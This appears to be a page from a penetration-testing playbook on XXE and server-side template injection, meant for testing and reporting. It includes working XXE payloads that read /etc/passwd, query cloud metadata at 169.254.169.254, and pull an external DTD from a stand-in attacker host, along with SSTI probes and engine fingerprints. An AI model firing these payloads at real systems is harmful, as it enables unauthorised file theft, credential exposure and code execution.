# XXE and SSTI — Injection to File Read / RCE

> Severity: High–Critical (both can reach file read, SSRF, or RCE)
> Scanner-blind: partly. High-value where XML is parsed or user input hits a template.
> Translate severity via `framework/severity-mapping.md`.

Two separate classes, grouped because both turn "your input is parsed by a powerful engine" into
serious impact.

---

## XXE — XML External Entity

### Where to look

Anywhere XML is accepted: SOAP APIs, SAML, RSS/Atom, `Content-Type: application/xml` or `text/xml`,
SVG and Office files (`FILE-UPLOAD.md`), `.docx`/`.xlsx`, sitemap uploads. Try switching a JSON
endpoint's content-type to XML.

### Test cases

```xml
<!-- File read -->
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<r>&x;</r>

<!-- SSRF / internal -->
<!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">]>

<!-- Blind / OOB (external DTD on your server) -->
<!DOCTYPE r [<!ENTITY % p SYSTEM "http://YOUR-HOST/e.dtd"> %p;]>
```

Confirm: the response returns file contents, or your listener receives the OOB request. A parse error
alone is a LEAD, not a finding.

---

## SSTI — Server-Side Template Injection

### Where to look

User input rendered through a server template: email/notification templates, custom themes, "welcome
{{name}}" personalization, exported documents, any reflected value that renders after math.

### Detection

Send a polyglot and watch for evaluation:

```
${7*7}  {{7*7}}  #{7*7}  <%= 7*7 %>  ${{7*7}}  #{7*7}
```

If `49` comes back, the template engine evaluated it. Then fingerprint the engine (Jinja2, Twig,
Freemarker, Velocity, ERB, Handlebars) to pick the right escalation.

```
Jinja2 (Python):  {{7*7}} -> confirm; then {{config}} / RCE gadgets
Twig (PHP):       {{7*7}} / {{_self}}
Freemarker (Java):${7*7} ; ERB (Ruby): <%= 7*7 %>
```

### Confirm it's real

`49` proves evaluation. Escalate **only as far as needed** to prove impact (read a config value or a
single file); do not run destructive commands on production. A reflected `{{7*7}}` that comes back
literally (not `49`) is not SSTI (`../false-positive-traps.md`).

## Report tips

- Show the exact input and the evaluated output (`49`, file contents, config).
- Name the engine and the realistic ceiling (file read vs. full RCE), demonstrated at the minimum.

## Resources

- [PortSwigger — XXE](https://portswigger.net/web-security/xxe) · [SSTI](https://portswigger.net/web-security/server-side-template-injection)
- [PayloadsAllTheThings — SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
